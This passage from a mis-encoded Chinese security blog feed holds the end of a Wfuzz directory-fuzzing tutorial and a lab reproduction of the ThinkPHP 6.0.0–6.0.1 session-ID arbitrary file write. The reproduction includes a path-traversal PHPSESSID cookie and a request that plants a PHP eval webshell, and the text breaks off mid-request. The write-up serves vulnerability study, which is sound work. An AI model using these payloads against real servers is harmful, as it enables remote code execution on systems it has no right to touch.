* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 5

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000002:   404        828 L    1806 W   36886 Ch    &quot;Login&quot;                                            
000000001:   200        45 L     150 W    2076 Ch     &quot;admin/&quot;                                           
 |_  Enqueued response for recursion (level=1)
000000003:   404        828 L    1806 W   36868 Ch    &quot;CVS&quot;                                              
000000004:   404        828 L    1806 W   36867 Ch    &quot;cgi&quot;                                              
000000006:   404        828 L    1815 W   36947 Ch    &quot;admin/ - admin/&quot;                                  
000000008:   404        828 L    1815 W   36923 Ch    &quot;admin/ - CVS&quot;                                     
000000009:   404        828 L    1815 W   36923 Ch    &quot;admin/ - cgi&quot;                                     
000000007:   200        79 L     220 W    3700 Ch     &quot;admin/ - Login&quot;                                   
000000005:   404        828 L    1806 W   36867 Ch    &quot;bin&quot;                                              
000000010:   404        828 L    1815 W   36922 Ch    &quot;admin/ - bin&quot;                                     

Total time: 1.141663
Processed Requests: 10
Filtered Requests: 0
Requests/sec.: 8.759149
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;å…¶ä»–&quot;&gt;å…¶ä»–&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Openssl&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å·¥å…·è¾“å‡ºä»¥è¿™ä¸ªå¼€å¤´ï¼Œæˆ‘åœ¨å¯»æ±‚è§£å†³åŠæ³•æ—¶å€™ï¼ŒStackOverflowæœ‰è¦å®‰è£…Pycurlï¼Œæˆ‘çœ‹è¿™å·¥å…·è¿˜æŒºéº»çƒ¦ï¼Œç„¶åçœ‹å¤§å®¶å†™Wfuzzçš„æ•™ç¨‹æˆªå›¾é‡Œéƒ½æœ‰è¿™å¥è¯ï¼Œå°±ä¸ç®¡å•¦ï¼Œç­‰ä»¥åæœ‰å½±å“å†è¯´&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Recipes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Wfuzzå¯ä»¥ç”Ÿæˆä¸€ä¸ªrecipesç”¨æ¥ä¿å­˜å‘½ä»¤ï¼Œæ–¹ä¾¿ä¸‹æ¬¡æ‰§è¡Œæˆ–è€…åˆ†äº«ç»™åˆ«äººã€‚&lt;/p&gt;

&lt;p&gt;ç”Ÿæˆä¸€ä¸ªrecipesï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --script=robots -z list,&quot;robots.txt&quot; --dumo-recipe outrecipe URL/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä½¿ç”¨æŸä¸ªrecipesï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --recip outrecipe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>true</name></author><category term="fuzz" /><summary type="html"></summary></entry><entry><title type="html">ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´</title><link href="http://localhost:4000/blog/thinkphp6.0/" rel="alternate" type="text/html" title="ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´" /><published>2020-03-13T15:13:21+08:00</published><updated>2020-03-13T15:13:21+08:00</updated><id>http://localhost:4000/blog/thinkphp6.0</id><content type="html" xml:base="http://localhost:4000/blog/thinkphp6.0/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#ç¯å¢ƒå‡†å¤‡&quot; id=&quot;markdown-toc-ç¯å¢ƒå‡†å¤‡&quot;&gt;ç¯å¢ƒå‡†å¤‡&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#æ´ææ¼æ´åˆ†æ&quot; id=&quot;markdown-toc-æ´ææ¼æ´åˆ†æ&quot;&gt;æ´æï¼ˆæ¼æ´åˆ†æï¼‰&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#å¤ç°æ¼æ´&quot; id=&quot;markdown-toc-å¤ç°æ¼æ´&quot;&gt;å¤ç°æ¼æ´&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#å…¶ä»–çš„å‘&quot; id=&quot;markdown-toc-å…¶ä»–çš„å‘&quot;&gt;å…¶ä»–çš„å‘&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ğŸ‘»2020å¹´1æœˆ10æ—¥ï¼ŒThinkPHPå›¢é˜Ÿå‘å¸ƒä¸€ä¸ªè¡¥ä¸æ›´æ–°ï¼Œä¿®å¤äº†ä¸€å¤„ç”±ä¸å®‰å…¨çš„SessionIdå¯¼è‡´çš„ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´ã€‚è¯¥æ¼æ´å…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡ç¯å¢ƒå¯ç”¨sessionçš„æ¡ä»¶ä¸‹åˆ›å»ºä»»æ„æ–‡ä»¶ä»¥åŠåˆ é™¤ä»»æ„æ–‡ä»¶ï¼Œåœ¨ç‰¹å®šæƒ…å†µä¸‹è¿˜å¯ä»¥getshell&lt;/p&gt;

&lt;p&gt;å…·ä½“å—å½±å“ç‰ˆæœ¬ä¸ºThinkPHP6.0.0-6.0.1&lt;/p&gt;

&lt;p&gt;ğŸ‘»æœ€æ—©æ˜¯çœ‹åˆ«äººå†™äº†å¦‚ä½•å¤ç°çš„ï¼Œç„¶åè¿™å‡ å¤©æ­å»ºUbuntu+PHP7.1+ThinkPHP6.0.0å¹¶å¤ç°è¿™ä¸ªä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´&lt;/p&gt;

&lt;p&gt;ä¸»è¦å½’çº³ä¸ºè¿½è¸ªSessionIdæ€ä¹ˆå°±å¯ä»¥ç¯¡æ”¹å•¦&lt;/p&gt;

&lt;p&gt;åœ¨ä»€ä¹ˆç‰¹å®šæƒ…å†µä¸‹å¯ä»¥getshellå•¦&lt;/p&gt;

&lt;h1 id=&quot;ç¯å¢ƒå‡†å¤‡&quot;&gt;ç¯å¢ƒå‡†å¤‡&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;PHP7.1&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt-get -y install php7.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/php7.1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.kancloud.cn/manual/thinkphp6_0/1037481&quot;&gt;ThinkPHP6&lt;/a&gt;&lt;/p&gt;

    &lt;p&gt;å®‰è£…&lt;code class=&quot;highlighter-rouge&quot;&gt;Composer&lt;/code&gt;&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -sS https://getcomposer.org/installer | php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;å¦‚æœæœ‰ä»€ä¹ˆä¹±ä¸ƒå…«ç³Ÿé”™è¯¯ï¼Œå¯ä»¥è¯•ä¸€è¯•&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo curl -sS https://getcomposer.org/installer | sudo php -d detect_unicode=Off
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;ç„¶åç§»åŠ¨&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mv composer.phar /usr/local/bin/composer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;ä¿®æ”¹æºä¸ºé˜¿é‡Œæº&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;å®‰è£…ThinkPHP6.0&lt;/p&gt;

    &lt;p&gt;ğŸ’¢å‘ï¼šè¿™é‡Œä¸éœ€è¦å†™&lt;code class=&quot;highlighter-rouge&quot;&gt;topthink/think=6.0.0dev&lt;/code&gt;ï¼Œä¸ç„¶ä¼šå¤±è´¥ï¼Œç‰ˆæœ¬å¯ä»¥åœ¨å®‰è£…å®Œä¹‹åä¿®æ”¹é…ç½®æ–‡ä»¶è¿›è¡Œç‰ˆæœ¬è¦†ç›–&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer create-project topthink/think=6.0.x-dev tp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;ğŸ’¢å‘ï¼š&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/keng_1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;è›¤ï¼ŸğŸ™„æä¸æ˜ç™½ï¼Œè¿˜æ”¹äº†åŠå¤©phpçš„é…ç½®æ–‡ä»¶ï¼ŒæŠŠextension=php_fileinfo.dllçš„å‹¾æ‰ï¼Œå…¶å®ä¸éœ€è¦ï¼Œ&lt;a href=&quot;https://blog.csdn.net/u014132947/article/details/80258099?depth_1-utm_source=distribute.pc_relevant.none-task&amp;amp;utm_source=distribute.pc_relevant.none-task&quot;&gt;å‚è€ƒè¿™ç¯‡æ–‡ç« &lt;/a&gt;ï¼Œå¢åŠ &lt;code class=&quot;highlighter-rouge&quot;&gt;--ignore-platform-reqs&lt;/code&gt;&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo composer --ignore-platform-reqs create-project topthink/think=6.0.x-dev tp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;å°±å¥½æƒ¹ğŸ˜
&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/thinkphpok.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;cdè¿›å…¥å®‰è£…å¥½çš„tp&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ php think run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;è®¿é—®http://localhost:8000/ï¼Œæ­¤æ—¶æ˜¯æœ€æ–°çš„6.0.2ç‰ˆæœ¬&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/ojbk.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;ä¿®æ”¹ä¸º6.0.0ç‰ˆæœ¬ï¼Œå°†&lt;code class=&quot;highlighter-rouge&quot;&gt;/app/composer.json:24&lt;/code&gt;ä¿®æ”¹ä¸º&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;topthink/framework&quot;: &quot;6.0.0&quot;,
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;ç„¶åæ‰§è¡Œå°†ç‰ˆæœ¬è¦†ç›–ä¸º6.0.0&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer update
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;å†æ¬¡&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ php think run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;http://localhost:8000/å°±ä¼šæ˜¯6.0.0ç‰ˆæœ¬äº†&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;æ´ææ¼æ´åˆ†æ&quot;&gt;æ´æï¼ˆæ¼æ´åˆ†æï¼‰&lt;/h1&gt;

&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://hacpai.com/article/1579965339516&quot;&gt;ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw&quot;&gt;ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ğŸ˜’å’‹ä¸¤ç¯‡åå­—ä¸€æ ·&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;å®˜æ–¹ä¿¡æ¯ï¼šThinkPHP å‘å¸ƒçš„è¡¥ä¸å£°ç§°ä¿®å¤äº†ä¸€å¤„ç”±äºä¸å®‰å…¨çš„ SessionId å¯¼è‡´çš„ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´ï¼šåœ¨å¼€å¯ Session çš„æƒ…å†µä¸‹å¯ä»¥å¯¼è‡´åˆ›å»ºä»»æ„æ–‡ä»¶ä»¥åŠåˆ é™¤ä»»æ„æ–‡ä»¶ï¼Œç‰¹å®šæƒ…å†µä¸‹å¯ä»¥ getshellã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ ¹æ®è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬åˆ°å®˜æ–¹ GitHub çš„ commit é¡µé¢æ‰¾ä¸€ä¸‹ç›¸å…³çš„æäº¤è®°å½•ï¼š&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/thinkphpgit.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;åœ¨src/think/session/Store.php ä¸­ 212 è¡Œåœ¨è®¾ç½® &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; æ—¶å¢åŠ äº†ä¸€ä¸ªå‡½æ•°ï¼š&lt;code class=&quot;highlighter-rouge&quot;&gt;ctype_alnum($text)&lt;/code&gt;ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯åˆ¤æ–­æ‰€æœ‰çš„å­—ç¬¦å…¨éƒ¨æ˜¯å­—æ¯å’Œ(æˆ–è€…)æ•°å­—ï¼Œè¿”å› TRUE å¦åˆ™è¿”å› FALSEï¼Œæ‰€ä»¥å¯èƒ½æ˜¯å­˜å‚¨ Session æ—¶å¯¼è‡´çš„æ–‡ä»¶å†™å…¥&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;è·Ÿè¿›æ‰¾ä¸€ä¸‹ç›¸å…³çš„å‡½æ•°&lt;/p&gt;

    &lt;p&gt;å¯ä»¥çœ‹åˆ° &lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/Store.php:254&lt;/code&gt; çš„ save()å‡½æ•°&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;263è¡Œwriteå†™å…¥sessionIdï¼Œ265è¡Œdeleteåˆ é™¤sessionIdï¼Œç»§ç»­è·Ÿè¿›writeå‡½æ•°ï¼Œåœ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/driver/File.php:210&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_2.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;ä»&lt;code class=&quot;highlighter-rouge&quot;&gt;$sessID&lt;/code&gt;æ¥&lt;code class=&quot;highlighter-rouge&quot;&gt;getFileName&lt;/code&gt;ï¼Œç„¶åç›´æ¥&lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile&lt;/code&gt;å†™å…¥ï¼Œç»§ç»­è¿½è¸ª&lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile&lt;/code&gt;å‡½æ•°ï¼Œè¿˜æ˜¯åœ¨File.phpä¸‹&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_3.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;å¯ä»¥çœ‹åˆ°è°ƒç”¨äº† &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents()&lt;/code&gt; å‡½æ•°ï¼Œè¿™é‡Œæ˜¯çœŸæ­£å†™å…¥æ–‡ä»¶çš„æ“ä½œäº†&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file_put_contents($path, $content, LOCK_EX);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/file_put_contents.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;å¦‚æœæ–‡ä»¶åä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼Œå¦åˆ™ç°æœ‰æ–‡ä»¶å°†è¢«è¦†ç›–ï¼Œé™¤éè®¾ç½®äº†FILE_APPENDæ ‡å¿—ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;åˆ†æï¼š&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;å‡½æ•° &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents($path,$content,LOCK_EX)&lt;/code&gt; ä¸­å‚æ•° &lt;code class=&quot;highlighter-rouge&quot;&gt;$path,$content&lt;/code&gt; æ¥æºäºå‡½æ•° &lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile($path,$data)&lt;/code&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;å‡½æ•° &lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile($path,$data)&lt;/code&gt; ä¸­å‚æ•° &lt;code class=&quot;highlighter-rouge&quot;&gt;$path,$data&lt;/code&gt; æ¥æºäºå‡½æ•° &lt;code class=&quot;highlighter-rouge&quot;&gt;write(String $sessionID,String $sessiData)&lt;/code&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;å‡½æ•° &lt;code class=&quot;highlighter-rouge&quot;&gt;write(String $sessionID,String $sessiData)&lt;/code&gt; ä¸­å‚æ•° &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionID,$sessiData&lt;/code&gt; æ¥æºäº &lt;code class=&quot;highlighter-rouge&quot;&gt;save()&lt;/code&gt; ä¸­è°ƒç”¨äº† &lt;code class=&quot;highlighter-rouge&quot;&gt;write()&lt;/code&gt;ï¼ŒåŒæ—¶ä¼ å…¥çš„å‚æ•° &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt; çš„å€¼æ˜¯è°ƒç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;getId()&lt;/code&gt; ä¼ å…¥çš„&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;ç»¼ä¸Šï¼Œæ–‡ä»¶åæ¥æºäº &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt;ï¼Œå½“ä¼ å…¥çš„ id å€¼é•¿åº¦ä¸º 32 ï¼Œåˆ›å»º &lt;code class=&quot;highlighter-rouge&quot;&gt;sessionId&lt;/code&gt;ï¼Œç„¶åè¿›è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;gitId()&lt;/code&gt;ï¼Œå°±æ˜¯è¿™é‡Œåˆ¤æ–­ä¸è¶³&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/session32.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ¥ä¸‹æ¥æ‰¾è°ƒç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;setId()&lt;/code&gt; çš„åœ°æ–¹&lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/middleware/SessionInit.php:46&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/sessionid.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;å…¶ä¸­ &lt;code class=&quot;highlighter-rouge&quot;&gt;cookieName&lt;/code&gt; çš„å€¼ä¸º &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;ï¼Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt; æ˜¯ &lt;code class=&quot;highlighter-rouge&quot;&gt;cookie&lt;/code&gt; ä¸­åä¸º &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt; çš„å€¼ï¼Œå› æ­¤æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œä»è€Œå¯¼è‡´å†™å…¥çš„æ–‡ä»¶åå¯æ§ã€‚&lt;/p&gt;

    &lt;p&gt;ä½†æ˜¯é»˜è®¤ç¯å¢ƒä¸‹ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;session&lt;/code&gt; çš„å†…å®¹ç”± &lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/Store.php:261&lt;/code&gt; çš„å˜é‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;$data&lt;/code&gt; ä¼ å…¥ï¼š&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_4.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$data&lt;/code&gt; åœ¨é»˜è®¤ç¯å¢ƒä¸­ä¸ºç©º:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_5.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;æ‰€ä»¥ï¼Œå¯åˆ©ç”¨çš„æ¡ä»¶æ¯”è¾ƒè‹›åˆ»&lt;/p&gt;

    &lt;p&gt;ğŸ‘¹ä¸€æ˜¯é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸å¼€å¯sessionçš„ï¼Œå¼€å¯sessionæ‰å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶æ“ä½œ&lt;/p&gt;

    &lt;p&gt;ğŸ‘¹äºŒæ˜¯å†™å…¥çš„ sessionå†…å®¹æ˜¯ç”±å®é™…çš„åç«¯ä¸šåŠ¡é€»è¾‘æ¥å†³å®šï¼Œåªæœ‰ç‰¹å®šæƒ…å†µæ‰èƒ½getshell&lt;/p&gt;

    &lt;p&gt;é‚£æ¥ä¸‹æ¥å°±getä¸€ä¸‹shellå§&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;å¤ç°æ¼æ´&quot;&gt;å¤ç°æ¼æ´&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ä¿®æ”¹&lt;code class=&quot;highlighter-rouge&quot;&gt;app/composer/Index.php&lt;/code&gt;ï¼ŒåŠ ä¸€å¥&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session('sueisok',&quot;1&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/sueisok.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;å¼€å¯sessionï¼Œå»æ‰&lt;code class=&quot;highlighter-rouge&quot;&gt;app/middleware.php:9&lt;/code&gt;ä¸­çš„æ³¨é‡Š&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/middleware.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;è®¿é—®ï¼ŒæŠ“åŒ…ï¼Œå°†&lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;æ”¹ä¸ºç›®å½•åœ°å€&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Cookie: PHPSESSID=../../../../public/sueisokkk.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;ğŸ’¢å‘ï¼šè¿™é‡Œçš„&lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;ä¸€å®šè¦æ˜¯32ä½çš„&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/okkkphp.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runtime/session/&lt;/code&gt;ä¸‹ä¼šç”Ÿæˆçš„sessionğŸ˜€&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/runtimesession.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ¥æ¶æ„æ“ä½œä¸€ä¸‹ï¼ŒæŠŠ&lt;code class=&quot;highlighter-rouge&quot;&gt;app/composer/Index.php&lt;/code&gt;é‡Œå†™å…¥&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session('sueisok',$_GET[&quot;c&quot;]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/getc.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;è®¿é—®ï¼ŒæŠ“åŒ…ï¼Œæ•°æ®åŒ…å†…å®¹&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /index.php?s=index/index&amp;amp;c=%3C?php%20eval($_GET[a]);?%3E HTTP/1.1
Host: 172.16.70.244:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=../../../../public/sueisokkk.php
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
